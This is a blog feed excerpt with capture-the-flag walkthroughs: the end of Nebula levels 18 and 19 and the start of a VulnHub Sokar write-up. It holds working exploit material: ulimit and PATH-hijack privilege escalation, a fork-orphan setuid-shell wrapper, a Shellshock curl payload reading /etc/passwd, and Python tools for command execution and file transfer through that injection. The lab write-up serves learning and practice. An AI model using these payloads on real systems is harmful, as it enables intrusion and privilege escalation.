      } else if(strncmp(line, &amp;quot;logout&amp;quot;, 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, &amp;quot;shell&amp;quot;, 5) == 0) {
          dvprintf(3, &amp;quot;attempting to start shell\n&amp;quot;);
          if(globals.loggedin) {
              execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
              err(1, &amp;quot;unable to execve&amp;quot;);
          }
          dprintf(&amp;quot;Permission denied\n&amp;quot;);
      } else if(strncmp(line, &amp;quot;logout&amp;quot;, 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, &amp;quot;closelog&amp;quot;, 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, &amp;quot;site exec&amp;quot;, 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, &amp;quot;setuser&amp;quot;, 7) == 0) {
          setuser(line + 8);
      }
  }

  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok. Not so small then. This program took a while to work through. Initially the vulnerability was not so obvious. I could figure out that a few flags were setting a few things inside the global struct and that a password file exists. If I was able to read the password, then I could be marked as logged in and eventually get to the line that does &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I noticed the buffer overflow and format string vulnerabilities, but considering the binary was compiled with SSP, partial RELO, and a NX stack, I figured that memory corruption was not necessarily the way to complete this one.&lt;/p&gt;

&lt;p&gt;Lots of toying around with the program eventually got me to realize the flaw. If for some reason the program was not able to read the password file successfully, it would just log us in. The password file is &lt;code&gt;/home/flag18/password&lt;/code&gt; and we don’t have the required permissions to move it or something. I suppose that would have been too easy anyways ;p&lt;/p&gt;

&lt;p&gt;So what do we have left? I had to poke around and think about conditions that could make opening a file fail. Eventually I remembered about maximum file descriptors and figured it was worth a shot. What motivated this thinking was the fact that the binary has a &lt;code&gt;closelog&lt;/code&gt; command too. So, I started to play around with &lt;code&gt;ulimit&lt;/code&gt;, gradually reducing &lt;code&gt;-n&lt;/code&gt; until I got to the value 4 as the one that would let me log in due to the fact that the password file could no longer being able to be read; This thanks to the maximum open files limit being reached.&lt;/p&gt;

&lt;p&gt;Without setting the max open files, a sample run would be:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ touch /tmp/log
level18@nebula:~$ tail -f /tmp/log &amp;amp;
[1] 6499

level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
shell
got [shell] as input
attempting to start shell
Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dropping the max open files to 4 though, we get:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ ulimit -n 4

level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
shell
got [shell] as input
attempting to start shell
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Login worked :) We can also now call the shell command however the max open files thing looks like a problem. Luckily the binary had that &lt;code&gt;closelog&lt;/code&gt; command that will free up a file descriptor. Rerunning the above but calling &lt;code&gt;closelog&lt;/code&gt; before we call &lt;code&gt;shell&lt;/code&gt; results in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 [GNU long option] [option] ...
    /home/flag18/flag18 [GNU long option] [option] script-file ...
GNU long options:
    --debug
    --debugger
    --dump-po-strings
    --dump-strings
    --help
    --init-file
    --login
    --noediting
    --noprofile
    --norc
    --posix
    --protected
    --rcfile
    --restricted
    --verbose
    --version
Shell options:
    -irsD or -c command or -O shopt_option      (invocation only)
    -abefhkmnptuvxBCHP or -o option
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Examining the error we get now together with the source code, it was clear that the arguments sent to the &lt;code&gt;flag18&lt;/code&gt; binary was also passed to the &lt;code&gt;execve()&lt;/code&gt; call. That means that the error is actually sourced from the fact that &lt;code&gt;sh&lt;/code&gt; has no &lt;code&gt;-d&lt;/code&gt; flag. In fact, one could replicate this error by simply calling &lt;code&gt;sh -d&lt;/code&gt;. This called for some more man page reading once again. I realized later that the error may have also been a sort of hint based on the fact that the &lt;em&gt;GNU long options&lt;/em&gt; are shown. &lt;code&gt;--rcfile&lt;/code&gt; seemed like a good option as it would allow me to specify a type of init script to run. I had a number of attempts to try get this into something workable. Eventually the only file I could get it to load was the logfile I was specifying when running &lt;code&gt;flag18&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- &#39;-&#39;
/home/flag18/flag18: invalid option -- &#39;r&#39;
/home/flag18/flag18: invalid option -- &#39;c&#39;
/home/flag18/flag18: invalid option -- &#39;f&#39;
/home/flag18/flag18: invalid option -- &#39;i&#39;
/home/flag18/flag18: invalid option -- &#39;l&#39;
/home/flag18/flag18: invalid option -- &#39;e&#39;
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
/tmp/log: line 1: Starting: command not found
/tmp/log: line 2: got: command not found
/tmp/log: line 3: attempting: command not found
/tmp/log: line 4: syntax error near unexpected token `(&#39;
/tmp/log: line 4: `logged in successfully (without password file)&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The line &lt;code&gt;Starting: command not found&lt;/code&gt; was as close as I could get to some form of controlled command execution. So, I created this file, exported it into my &lt;code&gt;PATH&lt;/code&gt; and used it to prepare a small SETUID C shell.&lt;/p&gt;

&lt;p&gt;So, to solve level18:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ vim /var/tmp/Starting
level18@nebula:~$ chmod +x /var/tmp/Starting
level18@nebula:~$ cat /var/tmp/Starting
#!/bin/sh
/bin/sh

level18@nebula:~$ tail -f /tmp/log &amp;amp;
[1] 7627

level18@nebula:~$ Starting up. Verbose level = 3
got [login egg] as input
attempting to login
logged in successfully (without password file)
got [closelog] as input

level18@nebula:~$ export PATH=/var/tmp:$PATH
level18@nebula:~$ ulimit -n 4

level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- &#39;-&#39;
/home/flag18/flag18: invalid option -- &#39;r&#39;
/home/flag18/flag18: invalid option -- &#39;c&#39;
/home/flag18/flag18: invalid option -- &#39;f&#39;
/home/flag18/flag18: invalid option -- &#39;i&#39;
/home/flag18/flag18: invalid option -- &#39;l&#39;
/home/flag18/flag18: invalid option -- &#39;e&#39;
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell

sh-4.2$ getflag
sh: start_pipeline: pgrp pipe: Too many open files
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level19&#34;&gt;level19&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level19/&#34;&gt;Level19&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a flaw in the below program in how it operates.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent&#39;s /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, &amp;quot;/proc/%d&amp;quot;, getppid());

  /* stat() it */

  if(stat(buf, &amp;amp;statbuf) == -1) {
      printf(&amp;quot;Unable to check parent process\n&amp;quot;);
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
      err(1, &amp;quot;Unable to execve&amp;quot;);
  }

  printf(&amp;quot;You are unauthorized to run this program\n&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This one had me completely lost. After studying the functions used, I resorted to getting a hint. Partially reading another walkthrough, I came to the section where it mentions a &lt;code&gt;fork()&lt;/code&gt; operation on the &lt;code&gt;flag19&lt;/code&gt; binary. Basically, what it boils down to is the fact that when the process is forked and the parent dies, PID 1 (owned by root) will become the owner causing the checks we have in this binary to fail.&lt;/p&gt;

&lt;p&gt;To go about this, we would have to write a small C wrapper that will fork itself. We need to give this wrapper a few seconds after the fork to finish off allowing the forked process to become orphaned. Once the process is in the orphaned state, we can &lt;code&gt;execv()&lt;/code&gt; the &lt;code&gt;flag19&lt;/code&gt; binary and prepare a shell :)&lt;/p&gt;

&lt;p&gt;So, to solve level19:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level19@nebula:/var/tmp$ vim pwn19.c
level19@nebula:/var/tmp$ cat pwn19.c
#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;unistd.h&amp;gt;

int main(void) {

    pid_t pid = fork();

    if (pid == 0) {

        char *arg[] = { &amp;quot;/bin/sh&amp;quot; , &amp;quot;-c&amp;quot; , &amp;quot;gcc /var/tmp/shell.c -o /var/tmp/flag19; chmod 4777 /var/tmp/flag19&amp;quot; , NULL};
        sleep(2); /* Give the fork 2 sec to orphan */
        execv(&amp;quot;/home/flag19/flag19&amp;quot;, arg);
        printf(&amp;quot;Done fork\n&amp;quot;);
        return 0;
    }

    printf(&amp;quot;Done parent\n&amp;quot;);
    return 0;
}

level19@nebula:/var/tmp$ gcc pwn19.c -o pwn19
level19@nebula:/var/tmp$ ./pwn19
Done parent

level19@nebula:/var/tmp$ /var/tmp/flag19
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP&amp;hellip; ;)&lt;/p&gt;

&lt;p&gt;As a final touch, my &amp;lsquo;loot&amp;rsquo; in &lt;code&gt;/var/tmp&lt;/code&gt; after finishing the last level:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/nebula_done.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>beating sokar the vulnhub turns 0b10 challenge</title>
      <link>https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/</link>
      <pubDate>Sat, 21 Feb 2015 15:55:03 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html&#34;&gt;Vulnhub is 0b10&lt;/a&gt; years old. That is binary for 2 :) In order to celebrate this, &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt;
 created &lt;a href=&#34;https://www.vulnhub.com/entry/sokar-1,113/&#34;&gt;Sokar&lt;/a&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/sokar_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Sokar was used as another writeup competition (the first for 2015), similar to the &lt;a href=&#34;https://leonjza.github.io/blog/2014/09/18/from-persistence/&#34;&gt;Persistence&lt;/a&gt; challenge from Sep &amp;lsquo;14.
From the &lt;a href=&#34;http://blog.vulnhub.com/2015/01/competition-sokar.html&#34;&gt;competition announcement blogpost&lt;/a&gt;, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.&lt;/p&gt;

&lt;p&gt;Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!&lt;/p&gt;

&lt;p&gt;Here is my entry for the competition. Enjoy! :)&lt;/p&gt;

&lt;h2 id=&#34;a-usual-start&#34;&gt;a usual start&lt;/h2&gt;

&lt;p&gt;You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire &lt;code&gt;nmap&lt;/code&gt; at it. I followed exactly these steps apart from using the usual &lt;code&gt;netdiscover&lt;/code&gt; to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.&lt;/p&gt;

&lt;p&gt;I knew which interface the network was bound to on my Mac, so I started the sniffer with &lt;code&gt;sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@laptop » sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1

[... snip IPv6 talky talky ...]

IP src 0.0.0.0         dst 255.255.255.255 UDP src port 68 dst port 67
IP src 192.168.217.254 dst 192.168.217.163 UDP src port 67 dst port 68
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;192.168.217.163&lt;/strong&gt;. Great. This will be our target for a &lt;code&gt;nmap&lt;/code&gt; scan. Sokar did not respond to pings, but that is no biggie. I see this many times in real world networks too, so heh. Don&amp;rsquo;t rely on ICMP traffic ;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ nmap --reason 192.168.217.163 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-02 21:09 SAST
Nmap scan report for 192.168.217.163
Host is up, received arp-response (0.00027s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT    STATE SERVICE  REASON
591/tcp open  http-alt syn-ack
MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 1133.72 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One port open on tcp. &lt;code&gt;tcp/591&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;cgi-bin-cat&#34;&gt;/cgi-bin/cat&lt;/h2&gt;

&lt;p&gt;The service on &lt;code&gt;tcp/591&lt;/code&gt; appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; to &lt;a href=&#34;http://192.168.217.163:591/cgi-bin/cat&#34;&gt;http://192.168.217.163:591/cgi-bin/cat&lt;/a&gt;. Requesting this page alone was the same stats, minus that creepy pink color ;)&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/sokar_cat.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I toyed around quite a bit with this webserver. The textbook approach of running &lt;code&gt;wfuzz&lt;/code&gt; to discover some web paths, &lt;code&gt;nikto&lt;/code&gt; to discover some interesting information etc. was used. Alas, none of these tools proved really useful.&lt;/p&gt;

&lt;p&gt;Applying some more brain thingies to my current situation, I remembered the &lt;a href=&#34;http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&#34;&gt;Shellshock&lt;/a&gt; bug disclosed in September 2014. The &lt;code&gt;/cgi-bin&lt;/code&gt; path was the biggest hint towards it. I also remembered &lt;a href=&#34;https://twitter.com/mubix&#34;&gt;@mubix&lt;/a&gt; was keeping a Github repository of &lt;a href=&#34;https://github.com/mubix/shellshocker-pocs&#34;&gt;PoC&amp;rsquo;s for shellshock&lt;/a&gt;, and promptly started to try a few against the CGI path.&lt;/p&gt;

&lt;p&gt;Eventually, &lt;a href=&#34;https://gist.github.com/mfadzilr/70892f43597e7863a8dc&#34;&gt;this&lt;/a&gt; PoC was modified a little to get me some working command injection via shellshock:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ curl -i -X OPTIONS -H &amp;quot;User-Agent: () { :;};echo;/usr/bin/id&amp;quot; &amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;
HTTP/1.1 200 OK
Date: Mon, 02 Feb 2015 21:23:07 GMT
Server: Apache/2.2.15 (CentOS)
Connection: close
Transfer-Encoding: chunked
Content-Type: text/plain; charset=UTF-8

uid=48(apache) gid=48(apache) groups=48(apache)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay. I was now able to execute commands as &lt;code&gt;apache&lt;/code&gt;. This allowed me to enumerate a great deal of the machine with relative ease.&lt;/p&gt;

&lt;h2 id=&#34;making-life-easier&#34;&gt;making life easier&lt;/h2&gt;

&lt;p&gt;Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called &lt;code&gt;shock.py&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar Shellshock Command Execution
# 2015 Leon Jacobs

import requests
import sys

if len(sys.argv) &amp;lt; 2:

    print &amp;quot; * Usage %s &amp;lt;cmd&amp;gt;&amp;quot; % sys.argv[0]
    sys.exit(1)

# vuln@ curl -i -X OPTIONS -H &amp;quot;User-Agent: () { :;};echo;/bin/cat /etc/passwd&amp;quot; &amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;
command = sys.argv[1].strip()
print &amp;quot; * Executing %s\n&amp;quot; % command

# prepare the sploit header
headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % command }
print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers).text.strip()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using the above script, I could now just do &lt;code&gt;python shock.py &amp;quot;/usr/bin/id&amp;quot;&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/id&amp;quot;
 * Executing /usr/bin/id

uid=48(apache) gid=48(apache) groups=48(apache)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;During the initial enumeration phase, I tried to build myself a reverse shell. I confirmed that &lt;code&gt;netcat&lt;/code&gt; was available and that &lt;code&gt;apache&lt;/code&gt; was allowed to execute it, however, all of my attempts failed. &lt;code&gt;SELinux&lt;/code&gt; was disabled so that was not the problem. Eventually I started wondering about egress fire-walling and decided that it was time for a outbound port scan!&lt;/p&gt;

&lt;p&gt;I was able to write to &lt;code&gt;/tmp&lt;/code&gt;, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially &lt;code&gt;echo &amp;lt;script source&amp;gt; &amp;gt;&amp;gt; /tmp/port_scan.py&lt;/code&gt;. Eventually I resorted to writing a helper called &lt;code&gt;transfer.py&lt;/code&gt; that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar Shellshock File Transfer
# 2015 Leon Jacobs

import requests
import sys
import os
import binascii

def do_command(command):

    headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % command }
    r = requests.options(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers)

    if not r.status_code == 200:
        raise Exception(&amp;quot; ! Command %s failed&amp;quot;)

if __name__ == &amp;quot;__main__&amp;quot;:

    if len(sys.argv) &amp;lt; 3:

        print &amp;quot; * Usage %s &amp;lt;source&amp;gt; &amp;lt;destination&amp;gt;&amp;quot; % sys.argv[0]
        sys.exit(1)

    # vuln@ curl -i -X OPTIONS -H &amp;quot;User-Agent: () { :;};echo;/bin/cat /etc/passwd&amp;quot; &amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;
    source = sys.argv[1].strip()
    destination = sys.argv[2].strip()
    print &amp;quot; * Starting transfer of local &#39;%s&#39; to remote &#39;%s&#39;&amp;quot; % (source, destination)

    hex_destination_file = &amp;quot;/tmp/&amp;quot; + binascii.b2a_hex(os.urandom(15)) + &amp;quot;.txt&amp;quot;
    print &amp;quot; * Temp file on remote will be: %s&amp;quot; % hex_destination_file

    # prepare a hex version of the local file
    with open(source) as f:
        source_file = f.read()

    # encode and split the source into chunks of 60
    source_file = source_file.encode(&#39;hex&#39;)
    source_data = {}
    source_data = [source_file[i:i+60] for i in range(0, len(source_file), 60)]

    print &amp;quot; * Transferring %d chunks to %s&amp;quot; % (len(source_data), hex_destination_file)
    iteration = 1
    for chunk in source_data:

        # check if it is start of file or append
        if iteration == 1:
            append = &amp;quot;&amp;gt;&amp;quot;
        else:
            append = &amp;quot;&amp;gt;&amp;gt;&amp;quot;

        # prepare the command and run it
        command = &amp;quot;echo &#39;%s&#39; %s %s&amp;quot; % (chunk, append, hex_destination_file)
        do_command(command)

        print &amp;quot; * Chunk %d/%d transferred&amp;quot; % (iteration, len(source_data))
        iteration += 1

    print &amp;quot; * Decoding hex on remote&amp;quot;
    command = &amp;quot;/usr/bin/xxd -r -p %s &amp;gt; %s&amp;quot; % (hex_destination_file, destination)
    do_command(command)

    print &amp;quot; * Cleaning up temp file %s&amp;quot; % hex_destination_file
    command = &amp;quot;/bin/rm -f %s&amp;quot; %  hex_destination_file
    do_command(command)

    print &amp;quot; * Local &#39;%s&#39; transferred to remote &#39;%s&#39;&amp;quot; % (source, destination)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;egress-firewalls-le-suck&#34;&gt;egress firewalls le-suck&lt;/h2&gt;

&lt;p&gt;With the file transfer script done, I coded up a small &amp;lsquo;port scanner&amp;rsquo; (though all it really does is try to connect to a port and move on to the next within 0.1s):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar Egress Port Scanner
# 2015 Leon Jacobs

import socket

for port in xrange(1, 65535):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1)
    print &amp;quot;Trying port %d&amp;quot; % port
    sock.connect_ex((&amp;quot;192.168.217.174&amp;quot;, port))
    sock.close()

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and transferred it to Sokar using my &lt;code&gt;transfer.py&lt;/code&gt; script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py
 * Starting transfer of local &#39;port_scan.py&#39; to remote &#39;/tmp/port_scan.py&#39;
 * Temp file on remote will be: /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Transferring 10 chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Chunk 1/10 transferred
 * Chunk 2/10 transferred
 * Chunk 3/10 transferred
 * Chunk 4/10 transferred
 * Chunk 5/10 transferred
 * Chunk 6/10 transferred
 * Chunk 7/10 transferred
 * Chunk 8/10 transferred
 * Chunk 9/10 transferred
 * Chunk 10/10 transferred
 * Decoding hex on remote
 * Cleaning up temp file /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Local &#39;port_scan.py&#39; transferred to remote &#39;/tmp/port_scan.py&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I also opened up a &lt;code&gt;tcpdump&lt;/code&gt; on my local Kali Linux VM, filtering out &lt;code&gt;tcp/591&lt;/code&gt; as well as &lt;code&gt;arp&lt;/code&gt; traffic:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally, I fired the scanner off using the previously developed &lt;code&gt;shock.py&lt;/code&gt; script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/python /tmp/port_scan.py&amp;quot;
 * Executing /usr/bin/python /tmp/port_scan.py

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I waited&amp;hellip; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the &lt;code&gt;tcpdump&lt;/code&gt; had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.&lt;/p&gt;

&lt;h2 id=&#34;bynarr-the-fruit&#34;&gt;bynarr the fruit&lt;/h2&gt;

&lt;p&gt;Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that &lt;code&gt;/home/bynarr&lt;/code&gt; was readable to me. In there was what looked like a kernel module &lt;code&gt;lime.ko&lt;/code&gt; and a script called &lt;code&gt;lime&lt;/code&gt; to &lt;code&gt;insmod&lt;/code&gt; it. Both were owned by root:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/bin/cat /home/bynarr/lime&amp;quot;
 * Executing /bin/cat /home/bynarr/lime

#!/bin/bash
echo &amp;quot;&amp;quot;&amp;quot;
==========================
Linux Memory Extractorator
==========================
&amp;quot;
echo &amp;quot;LKM, add or remove?&amp;quot;
echo -en &amp;quot;&amp;gt; &amp;quot;

read -e input

if [ $input == &amp;quot;add&amp;quot; ]; then

    /sbin/insmod /home/bynarr/lime.ko &amp;quot;path=/tmp/ram format=raw&amp;quot;

elif [ $input == &amp;quot;remove&amp;quot; ]; then

    /sbin/rmmod lime

else

    echo &amp;quot;Invalid input, burn in the fires of Netu!&amp;quot;

fi

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I knew that the chances were slim that it would allow me to run &lt;code&gt;insmod&lt;/code&gt; as &lt;code&gt;apache&lt;/code&gt;, but ofc I tried running the script regardless. Due to the fact that the file called &lt;code&gt;/tmp/ram&lt;/code&gt; was not created after running &lt;code&gt;python shock.py &amp;quot;echo \&amp;quot;add\&amp;quot; | /home/bynarr/lime&amp;quot;&lt;/code&gt;, I assumed it failed.&lt;/p&gt;

&lt;p&gt;Later, some more enumeration finally got me to &lt;code&gt;/var/spool/mail/bynarr&lt;/code&gt; with a message with the following contents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/bin/cat /var/spool/mail/bynarr&amp;quot;
 * Executing /bin/cat /var/spool/mail/bynarr

Return-Path: &amp;lt;root@sokar&amp;gt;
Delivered-To: bynarr@localhost
Received:  from root by localhost
To: &amp;lt;bynarr@sokar&amp;gt;
Date: Thu, 13 Nov 2014 22:04:31 +0100
Subject: Welcome

Dear Bynarr.  Welcome to Sokar Inc. Forensic Development Team.
A user account has been setup for you.

UID 500 (bynarr)
GID 500 (bynarr)
    501 (forensic)

Password &#39;fruity&#39;.  Please change this ASAP.
Should you require, you&#39;ve been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out for analysis.

All the best in your new role!

  -Sokar-
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I confirmed that &lt;code&gt;bynarr&lt;/code&gt; was in the groups mentioned in the mail:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/id bynarr&amp;quot;
 * Executing /usr/bin/id bynarr

uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What confused me here was the mention of &lt;em&gt;&amp;ldquo;outbound ephemeral port access on 51242&amp;rdquo;&lt;/em&gt;. I reduced my port scanners range to only scan from 51240 to 51250 to confirm this. I transferred the updated port scanner to Sokar, opened up a new &lt;code&gt;tcpdump&lt;/code&gt; session and waited anxiously. &lt;code&gt;tcp/51242&lt;/code&gt; outbound still appeared to be closed.&lt;/p&gt;

&lt;p&gt;Of course, the most valuable piece of information was definitely the password &lt;em&gt;fruity&lt;/em&gt;. Now, remember, I have a limited shell. Not a interactive one. I have been interfacing with Sokar only via python scripts which are executing commands via Shellshock HTTP requests.&lt;/p&gt;

